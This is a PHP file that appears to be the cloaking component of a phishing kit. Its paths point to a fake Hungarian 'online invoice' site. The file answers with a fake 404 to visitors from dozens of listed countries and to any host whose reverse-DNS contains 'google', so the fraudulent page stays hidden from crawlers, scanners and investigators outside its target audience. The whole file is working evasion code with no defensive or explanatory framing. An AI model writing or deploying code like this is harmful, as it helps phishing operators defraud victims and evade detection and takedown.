<?php
include("./onlineszamla/config/madara.php");
 $_SESSION['cntcode'] = $countrycode;
        $_SESSION['cntname'] = $countryname;
if(strpos($_SESSION['cntname'],'United States') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SESSION['cntname'],'Germany') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SESSION['cntname'],'France') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SESSION['cntname'],'Netherland') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SESSION['cntname'],'Austria') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SESSION['cntname'],'Czechia') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SESSION['cntname'],'Belgium') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SESSION['cntname'],'United Kingdom') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SESSION['cntname'],'Switzerland') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SESSION['cntname'],'India') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SESSION['cntname'],'Mexico') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SESSION['cntname'],'Sweden') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SESSION['cntname'],'Singapore') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SESSION['cntname'],'Poland') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SESSION['cntname'],'Republic of Korea') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SESSION['cntname'],'Canada') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SESSION['cntname'],'Portugal') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SESSION['cntname'],'St Kitts and Nevis') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SESSION['cntname'],'Costa Rica') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SESSION['cntname'],'Luxembourg') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SESSION['cntname'],'Ireland') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SESSION['cntname'],'Spain') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SESSION['cntname'],'Finland') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SESSION['cntname'],'Norway') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SESSION['cntname'],'Ukraine') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SESSION['cntname'],'Netherlands') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SESSION['cntname'],'South Africa') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SESSION['cntname'],'Bulgaria') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SESSION['cntname'],'Italy') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SESSION['cntname'],'Croatia') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SESSION['cntname'],'Romania') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SESSION['cntname'],'Greece') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SESSION['cntname'],'Slovakia') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SESSION['cntname'],'Serbia') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SESSION['cntname'],'Slovenia') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SESSION['cntname'],'Brazil') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SESSION['cntname'],'Japan') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SESSION['cntname'],'Montenegro') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SESSION['cntname'],'Turkey') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SESSION['cntname'],'Belize') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SESSION['cntname'],'Latvia') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SESSION['cntname'],'Australia') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SESSION['cntname'],'China') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SESSION['cntname'],'Tunisia') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }

########################################MADARA######################################################################


if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
?>